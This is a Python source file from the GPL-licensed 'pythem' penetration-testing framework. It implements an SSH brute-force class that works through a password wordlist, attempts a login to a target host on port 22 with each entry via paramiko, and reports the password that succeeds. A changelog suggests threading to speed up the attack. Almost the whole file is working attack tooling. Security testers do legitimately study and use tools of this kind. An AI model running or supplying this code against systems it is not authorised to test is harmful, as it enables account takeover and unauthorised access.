"""Part of the pythem framework. """
#
# Copyright (c) 2016-2018 Angelo Moura
#
# This file is part of the program pythem
#
# pythem is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#
# === Change log:
#
# 2016, Aug 06, Bifrozt
#   - Removed shebang from module
#   - Minimized length of args
#   - Verify that file object exists
#   - Verify that user has read access to file object
#   - Removed use of python builtin word: 'file' replaced with 'fobj'
#   - Defined connection timeout (2 sec) for non responsive SSH server.
#     Will return a tuple from try-except in ssh_connect() on timeout.
#     Calls sys.exit(1) if timeout to SSH server occurs.
#   - try-except in start() will check type before if-elif statements
#   - Calls sys.exit(0) when correct password is found.
#   - Removed try-except in start(). Not sure what exceptions this will be
#     catching, except a possible KeyboardInterrupt?
#
#
# === Future development suggestions:
#
# 2016, Aug 06, Bifrozt
#   - Use 'threading' to improve brute force attack speed
#
#
import os
import paramiko
import sys
import socket
from os import R_OK


class SSHbrutus(object):
    """SSH brute force class. """
    name = "SSH Brute-forcer"
    desc = "Perform password brute-force on SSH"
    version = "0.1"

    def __init__(self, trgt, usr, fobj):
        self.trgt = trgt
        self.usr = usr
        self.fobj = fobj

    def exists(self):
        """Tests if the file exists and if the executing user has read access
        to the file. Returns file if both tests are passed. """
        if not os.path.isfile(self.fobj):
            print '[-] File not found: {0}'.format(self.fobj)
            sys.exit(1)

        if not os.access(self.fobj, R_OK):
            print '[-] Denied read access: {0}'.format(self.fobj)
            sys.exit(1)

        if os.path.isfile(self.fobj) and os.access(self.fobj, R_OK):
            return self.fobj

    def ssh_connect(self, passwd, code=0):
        """Connects to the SSH server, attempts to authenticate and returns the
        exit code from the attempt. """
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            ssh.connect(self.trgt, port=22, username=self.usr, password=passwd, timeout=2)
        except paramiko.AuthenticationException:
            code = 1
        except socket.error, err:
            code = 2, err

        ssh.close()
        return code

    def start(self):
        """Itterates trough the password list and checks wheter or not the
        correct password has been found. """
        fobj = self.exists()
        wlist = open(fobj)

        for i in wlist.readlines():
            passwd = i.strip("\n")
            resp = self.ssh_connect(passwd)

            if type(resp) == int:

                if resp == 0:
                    print "[+] User: {0}".format(self.usr)
                    print "[+] Password found!: {0}".format(passwd)
                    break

                if resp == 1:
                    print "[-] User: {0} Password: {1}".format(self.usr, passwd)

            elif resp[0] == 2:
                print "[!] {0}: {1}".format(resp[1], self.trgt)
                break

        wlist.close()
